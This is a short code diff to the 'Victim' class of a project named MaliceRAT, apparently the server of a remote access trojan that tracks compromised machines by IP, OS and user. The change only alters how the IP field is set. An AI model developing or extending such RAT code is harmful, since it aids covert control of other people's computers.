@@ -6,7 +6,7 @@ namespace MaliceRAT.RatServer
 {
     public class Victim
     {
-        public string IP { get; private set; }
+        public string IP { get; set; }
         public string OS { get; set; }
         public TcpClient TcpClient { get; private set; }
         public int Id { get; set; }
@@ -15,10 +15,9 @@ namespace MaliceRAT.RatServer
 
         public Victim(TcpClient client, int id)
         {
-            IPEndPoint clientEndPoint = client.Client.RemoteEndPoint as IPEndPoint;
-            IP = clientEndPoint.Address.ToString();
-            OS = "N/A";
             TcpClient = client;
+            IP = "N/A";
+            OS = "N/A";
             Id = id;
             PC = "N/A";
             User = "N/A";
